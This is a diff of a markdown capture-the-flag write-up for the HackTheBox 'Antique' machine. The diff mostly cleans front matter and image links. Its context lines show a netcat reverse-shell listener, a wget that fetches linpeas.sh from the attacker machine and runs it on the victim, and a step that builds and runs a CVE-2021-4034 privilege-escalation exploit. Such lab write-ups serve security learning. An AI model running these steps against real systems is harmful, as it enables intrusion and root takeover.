@@ -1,10 +1,6 @@
----
-title: "HackTheBox Antique Walkthrough"
-date: "2022-06-14"
-categories: 
-  - "htb-walkthroughs"
-coverImage: "image-9.png"
----
+
+#HackTheBox Antique Walkthrough
+
 
 Here's a result of the NMAP Scan.
 
@@ -64,7 +60,7 @@ We have TCP port 23 open and UDP port 161 open.
 
 telnet 10.10.11.107
 
-[![](images/image-2.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-2.png)
+[![](images/image-2.png)]
 
 We need a password, the password might be sent over in clear text.
 
@@ -93,7 +89,7 @@ We also need to start a netcat listener on our kali machine.
 
 nc -lnvp 4444
 
-[![](images/image-8-1024x661.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-8.png)
+[![](images/image-8-1024x661.png)]
 
 We're in and we have our first user flag!
 
@@ -106,7 +102,7 @@ And on the victim machine.
 wget 10.10.14.19:6666/linpeas.sh
 ./linpeas.sh
 
-[![](images/image-9-1024x579.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-9.png)
+[![](images/image-9-1024x579.png)]
 
 The machine is vulnerable to CVE-2021-4034
 
@@ -126,6 +122,6 @@ make
 
 make and run the CVE.
 
-[![](images/image-10.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-10.png)
+[![](images/image-10.png)]
 
 And we're root!
